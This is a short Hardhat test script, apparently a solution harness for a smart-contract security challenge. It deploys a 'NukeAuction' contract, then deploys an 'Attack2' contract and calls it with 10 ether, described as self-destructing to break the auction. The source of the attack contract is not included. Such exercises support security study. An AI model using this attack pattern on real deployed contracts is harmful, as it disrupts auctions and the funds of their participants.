const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
                         


describe("Challenge 04", function () {
    it("Should deploy the contract, deploy an attack contract, autodestroy it, and prevent the auction from functioning", async function ()
    {
    
        const challenge01 = await ethers.getContractFactory("NukeAuction");
        const challenge01_contract = await challenge01.deploy();
        await challenge01_contract.deployed();

        console.log("Contract deployed to ", challenge01_contract.address);

        let sane = await challenge01_contract.isAuctionSane();
        console.log("Is sane ? ", sane);

        const challenge01pwn = await ethers.getContractFactory("Attack2");
        const challenge01pwn_contract = await challenge01pwn.deploy(challenge01_contract.address);
        await challenge01pwn_contract.deployed();

        overrides = { value : ethers.utils.parseEther("10.0") };
        let pwntx = await challenge01pwn_contract.attack(overrides);
        await pwntx.wait();
        
        sane = await challenge01_contract.isAuctionSane();
        console.log("Is sane ? ", sane);

        let bal = await challenge01_contract.getBalance();
        console.log("BAL:", bal);

    });
});